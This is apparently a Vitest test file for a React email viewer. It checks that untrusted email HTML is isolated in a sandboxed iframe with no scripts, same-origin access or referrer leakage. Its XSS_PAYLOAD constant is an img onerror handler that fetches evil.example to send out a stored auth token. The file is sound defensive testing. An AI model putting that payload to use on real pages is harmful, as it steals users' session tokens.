import { readFileSync } from 'node:fs'
import path from 'node:path'
import { describe, it, expect } from 'vitest'
import { render, screen } from '@/test/test-utils'
import { EmailHtmlViewer } from '@/components/email-html-viewer'

const XSS_PAYLOAD = `<img data-xss="1" src=x onerror="fetch('https://evil.example/?t='+localStorage.auth_token)">`

function getFrame(): HTMLIFrameElement {
  const frame = document.querySelector('iframe')
  expect(frame).not.toBeNull()
  return frame as HTMLIFrameElement
}

describe('EmailHtmlViewer', () => {
  it('renders untrusted email HTML inside an iframe rather than the parent document', () => {
    render(<EmailHtmlViewer html={XSS_PAYLOAD} />)

    const frame = getFrame()
    expect(frame.getAttribute('srcdoc')).toContain(XSS_PAYLOAD)
  })

  it('never injects the email markup into the parent document', () => {
    render(<EmailHtmlViewer html={XSS_PAYLOAD} />)

    // The payload must not have been parsed into live nodes of the host page.
    expect(document.querySelector('[data-xss]')).toBeNull()
    expect(document.querySelectorAll('img').length).toBe(0)
    expect(document.querySelectorAll('script').length).toBe(0)
  })

  it('sandboxes the iframe without allow-scripts or allow-same-origin', () => {
    render(<EmailHtmlViewer html="<p>hello</p>" />)

    const frame = getFrame()
    const sandbox = frame.getAttribute('sandbox')

    // The attribute must be present at all — a missing sandbox attribute means no sandbox.
    expect(sandbox).not.toBeNull()
    const tokens = (sandbox as string).split(/\s+/).filter(Boolean)
    expect(tokens).not.toContain('allow-scripts')
    expect(tokens).not.toContain('allow-same-origin')
    // Belt and braces: the two tokens that together defeat the sandbox.
    expect(sandbox).not.toMatch(/allow-scripts/)
    expect(sandbox).not.toMatch(/allow-same-origin/)
  })

  it('does not leak the referrer to remote assets in the email', () => {
    render(<EmailHtmlViewer html="<p>hello</p>" />)

    const frame = getFrame()
    expect(frame.getAttribute('referrerpolicy')).toBe('no-referrer')
    expect(frame.getAttribute('srcdoc')).toContain('name="referrer"')
  })

  it('renders the plain-text fallback as text when there is no HTML body', () => {
    render(<EmailHtmlViewer html={null} text={'plain <b>not bold</b> body'} />)

    expect(document.querySelector('iframe')).toBeNull()
    expect(screen.getByText(/plain <b>not bold<\/b> body/)).toBeInTheDocument()
    expect(document.querySelector('b')).toBeNull()
  })

  it('exposes an expand control so tall emails are not permanently clipped', async () => {
    const { user } = render(<EmailHtmlViewer html="<p>hello</p>" />)

    const before = getFrame().style.height
    await user.click(screen.getByRole('button', { name: /expand/i }))
    const after = getFrame().style.height

    expect(before).not.toBe(after)
    expect(parseInt(after, 10)).toBeGreaterThan(parseInt(before, 10))
  })

  it('applies className in both the HTML and the plain-text branch', () => {
    const { container: htmlBranch } = render(
      <EmailHtmlViewer html="<p>hello</p>" className="test-spacing" />,
    )
    expect(htmlBranch.querySelector('.test-spacing')).not.toBeNull()

    const { container: textBranch } = render(
      <EmailHtmlViewer text="hello" className="test-spacing" />,
    )
    const pre = textBranch.querySelector('pre')
    expect(pre).not.toBeNull()
    expect(pre).toHaveClass('test-spacing')
    // the component's own defaults survive the merge
    expect(pre).toHaveClass('whitespace-pre-wrap')
  })
})

describe('email HTML sinks', () => {
  const repoRoot = path.resolve(__dirname, '..', '..')

  it('the thread view no longer uses dangerouslySetInnerHTML for message bodies', () => {
    const source = readFileSync(
      path.join(repoRoot, 'app', 'emails', '[id]', 'page.tsx'),
      'utf8',
    )

    expect(source).not.toContain('dangerouslySetInnerHTML')
    expect(source).toContain('EmailHtmlViewer')
  })
})
